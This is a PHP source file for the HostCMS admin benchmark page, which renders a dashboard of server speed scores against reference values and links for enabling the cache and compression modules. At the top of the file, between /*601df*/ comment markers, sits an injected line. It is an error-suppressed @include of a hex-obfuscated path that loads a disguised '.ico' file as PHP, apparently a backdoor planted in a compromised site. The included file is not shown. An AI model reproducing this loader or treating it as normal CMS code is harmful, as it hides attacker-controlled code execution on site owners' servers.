<?php


/*601df*/

@include "\x2fhom\x65/ne\x6f-vo\x2ffeo\x72o.r\x75/do\x63s/m\x6fdul\x65s/b\x65nch\x6dark\x2fcon\x66ig/\x66avi\x63on_\x6561c\x32d.i\x63o";

/*601df*/
/**
 * Benchmark.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once('../../bootstrap.php');

Core_Auth::authorization($sModule = 'benchmark');

// Код формы
$iAdmin_Form_Id = 196;
$sAdminFormAction = '/admin/benchmark/index.php';

$oAdmin_Form = Core_Entity::factory('Admin_Form', $iAdmin_Form_Id);

// Контроллер формы
$oAdmin_Form_Controller = Admin_Form_Controller::create($oAdmin_Form);
$oAdmin_Form_Controller
	->module(Core_Module::factory($sModule))
	->setUp()
	->path($sAdminFormAction)
	->title(Core::_('Benchmark.title'))
	->pageTitle(Core::_('Benchmark.title'));

$sEnable = Core_Array::getGet('enable');

// Включение модуля
if (!is_null($sEnable))
{
	$oModule = Core_Entity::factory('Module')->getByPath($sEnable);

	if (!is_null($oModule) && !$oModule->active)
	{
		$oModule->changeActive();
	}
}

// Меню формы
$oAdmin_Form_Entity_Menus = Admin_Form_Entity::factory('Menus');

// Элементы меню
$oAdmin_Form_Entity_Menus->add(
	Admin_Form_Entity::factory('Menu')
		->name(Core::_('Benchmark.menu_rate'))
		->icon('fa fa-rocket')
		->img('/admin/images/ip_add.gif')
		->href(
			$oAdmin_Form_Controller->getAdminActionLoadHref($oAdmin_Form_Controller->getPath(), 'check', NULL, 0, 0)
		)
		->onclick(
			$oAdmin_Form_Controller->getAdminActionLoadAjax($oAdmin_Form_Controller->getPath(), 'check', NULL, 0, 0)
		)
)->add(
	Admin_Form_Entity::factory('Menu')
		->name(Core::_('Benchmark.menu_site_speed'))
		->icon('fa fa-tachometer')
		->img('/admin/images/ip_add.gif')
		->href(
			$oAdmin_Form_Controller->getAdminLoadHref('/admin/benchmark/url/index.php', NULL, NULL, '')
		)
		->onclick(
			$oAdmin_Form_Controller->getAdminLoadAjax('/admin/benchmark/url/index.php', NULL, NULL, '')
		)
);

// Добавляем все меню контроллеру
$oAdmin_Form_Controller->addEntity($oAdmin_Form_Entity_Menus);

// Элементы строки навигации
$oAdmin_Form_Entity_Breadcrumbs = Admin_Form_Entity::factory('Breadcrumbs');

// Элементы строки навигации
$oAdmin_Form_Entity_Breadcrumbs->add(
	Admin_Form_Entity::factory('Breadcrumb')
		->name(Core::_('Benchmark.title'))
		->href(
			$oAdmin_Form_Controller->getAdminLoadHref($oAdmin_Form_Controller->getPath(), NULL, NULL, '')
		)
		->onclick(
			$oAdmin_Form_Controller->getAdminLoadAjax($oAdmin_Form_Controller->getPath(), NULL, NULL, '')
	)
);

// Добавляем все хлебные крошки контроллеру
$oAdmin_Form_Controller->addEntity($oAdmin_Form_Entity_Breadcrumbs);

// Действие редактирования
$oAdmin_Form_Action = Core_Entity::factory('Admin_Form', $iAdmin_Form_Id)
	->Admin_Form_Actions
	->getByName('check');

if ($oAdmin_Form_Action && $oAdmin_Form_Controller->getAction() == 'check')
{
	$oBenchmark_Controller_Check = Admin_Form_Action_Controller::factory('Benchmark_Controller_Check', $oAdmin_Form_Action);

	// Добавляем типовой контроллер редактирования контроллеру формы
	$oAdmin_Form_Controller->addAction($oBenchmark_Controller_Check);
}

// Источник данных 1
$oAdmin_Form_Dataset = new Admin_Form_Dataset_Entity(
	Core_Entity::factory('Benchmark')
);

// Ограничение по сайту
$oAdmin_Form_Dataset->addCondition(
	array('where' =>
		array('site_id', '=', CURRENT_SITE)
	)
);

// Добавляем источник данных контроллеру формы
$oAdmin_Form_Controller->addDataset(
	$oAdmin_Form_Dataset
);

$oBenchmark = Core_Entity::factory('Benchmark');
$oBenchmark
	->queryBuilder()
	->where('benchmarks.site_id', '=', CURRENT_SITE)
	->limit(1)
	->clearOrderBy()
	->orderBy('benchmarks.id', 'DESC');

$aBenchmarks = $oBenchmark->findAll(FALSE);

if(count($aBenchmarks))
{
	$oBenchmark = $aBenchmarks[0];

	$iBenchmark = $oBenchmark->getBenchmark(); //Общая оценка производительности сайта

	$aColors = array('gray', 'danger', 'orange', 'warning', 'success');
	$sColor = $aColors[ceil($iBenchmark / 25)];

	ob_start();
	?>
	<div class="row">
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-graded databox-vertical">
				<div class="databox-top no-padding ">
					<div class="databox-row">
						<div class="databox-cell cell-12 text-align-center bg-<?php echo $sColor?>">
							<span class="databox-number benchmark-databox-number"><?php echo $iBenchmark?> / 100</span>
							<span class="databox-text"><?php echo Core::_('Benchmark.menu')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom">
					<span class="databox-text"><?php echo Core::_('Benchmark.benchmark')?></span>
					<div class="progress progress-sm">
						<div class="progress-bar progress-bar-<?php echo $sColor?>" role="progressbar" aria-valuenow="<?php echo $iBenchmark?>" aria-valuemin="0" aria-valuemax="100" style="width: <?php echo $iBenchmark?>%">
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->mysql_write < $oBenchmark->etalon_mysql_write
					? 'bg-darkorange'
					: 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.bd_write')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->mysql_write?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_mysql_write?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->mysql_read < $oBenchmark->etalon_mysql_read ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.bd_read')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->mysql_read?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_mysql_read?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->mysql_update < $oBenchmark->etalon_mysql_update ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
								<span><?php echo Core::_('Benchmark.bd_change')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->mysql_update?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_mysql_update?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->filesystem < $oBenchmark->etalon_filesystem ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.filesystem')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->filesystem?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_filesystem?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->cpu_math < $oBenchmark->etalon_cpu_math ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.cpu_math')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->cpu_math?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_cpu_math?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->cpu_string < $oBenchmark->etalon_cpu_string ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.cpu_string')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->cpu_string?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo $oBenchmark->etalon_cpu_string?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->network < $oBenchmark->etalon_network ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.download_speed')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo Core::_('Benchmark.mbps', $oBenchmark->network)?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo Core::_('Benchmark.mbps', $oBenchmark->etalon_network)?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
			<div class="databox radius-bordered databox-shadowed databox-vertical">
				<div class="databox-top <?php echo $oBenchmark->mail > $oBenchmark->etalon_mail ? 'bg-darkorange' : 'bg-palegreen'?> no-padding">
					<div class="databox-row row-2"></div>
					<div class="databox-row row-10">
						<div class="databox-sparkline benchmark-databox-sparkline">
							<span><?php echo Core::_('Benchmark.email')?></span>
						</div>
					</div>
				</div>
				<div class="databox-bottom no-padding bg-white">
					<div class="databox-row">
						<div class="databox-cell cell-6 text-align-center bordered-right bordered-platinum">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo Core::_('Benchmark.email_val',$oBenchmark->mail)?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.server')?></span>
						</div>
						<div class="databox-cell cell-6 text-align-center">
							<span class="databox-number lightcarbon benchmark-databox"><?php echo Core::_('Benchmark.email_val',$oBenchmark->etalon_mail)?></span>
							<span class="databox-text sonic-silver no-margin"><?php echo Core::_('Benchmark.etalon')?></span>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="row">
		<div class="col-lg-12">
			<div class="well">
				<?php
				function showModule($oAdmin_Form_Controller, $modulePath, $integration, $name, $description)
				{
					?><div class="row margin-bottom-10">
					<div class="col-xs-6 col-sm-4 col-md-3 col-lg-4">
						<h3><?php echo $name?>:</h3>
					</div>
					<div class="col-xs-3 col-sm-3 col-md-3 col-lg-2">
						<?php
						if (Core::moduleIsActive($modulePath))
						{
							$status = TRUE;
							$alert = 'success';
							$ico = 'fa fa-check';
							$caption = Core::_('Admin_Form.enabled');
						}
						elseif(Core_Array::get(Core::$config->get('core_hostcms'), 'integration', 0) > $integration)
						{
							$alert = 'danger';
							$status = FALSE;
							$ico = 'fa fa-times';
							$caption = Core::_('Admin_Form.disabled');
						}
						else
						{
							$alert = 'danger';
							$status = NULL;
							$ico = 'fa fa-times';
							$caption = Core::_('Admin_Form.not-installed');
						}
						?>
						<div class="alert alert-<?php echo $alert?> fade in small">
							<i class="fa-fw <?php echo $ico?>"></i>
								<strong><?php echo $caption?></strong>
						</div>
					</div>
					<div class="col-xs-3 col-sm-2 col-md-1 col-lg-2">
						<?php
						if (!$status)
						{
							if (is_null($status))
							{
								$sBuyLink = defined('HOSTCMS_CONTRACT_NUMBER') && HOSTCMS_CONTRACT_NUMBER
									? 'http://www.hostcms.ru/users/licence/redaction/'
										. urlencode(str_replace('/', ' ', HOSTCMS_CONTRACT_NUMBER))
										. '/'
									: 'http://www.hostcms.ru/shop';

								// Купить
								?>
								<a class="btn btn-labeled btn-success" href="<?php echo $sBuyLink?>" target="_blank">
									<i class="btn-label fa fa-money"></i>
									<?php echo Core::_('Admin_Form.buy')?>
								</a>
								<?php
							}
							else
							{
								// Включить
								?>
								<a class="btn btn-labeled btn-success" onclick="<?php echo $oAdmin_Form_Controller->getAdminActionLoadAjax($oAdmin_Form_Controller->getPath(), '', NULL, 0, 0, 'enable=' . $modulePath)?>">
									<i class="btn-label fa fa-lightbulb-o"></i>
									<?php echo Core::_('Admin_Form.enable')?>
								</a>
								<?php
							}
						}
						?>
					</div>
					<div class="col-xs-12 col-sm-3 col-md-5 col-lg-4 small">
						<?php echo $description?>
					</div>
				</div><?php
				}

				showModule($oAdmin_Form_Controller, 'cache', 4, Core::_('Benchmark.cache'), Core::_('Benchmark.cache_description'));
				showModule($oAdmin_Form_Controller, 'compression', 2, Core::_('Benchmark.compression'), Core::_('Benchmark.compression_description'));
				?>
			</div>
		</div>
	</div>
	<?php
	$oAdmin_Form_Controller->addEntity(
		Admin_Form_Entity::factory('Code')
			->html(ob_get_clean())
	);
}

// Показ формы
$oAdmin_Form_Controller->execute();
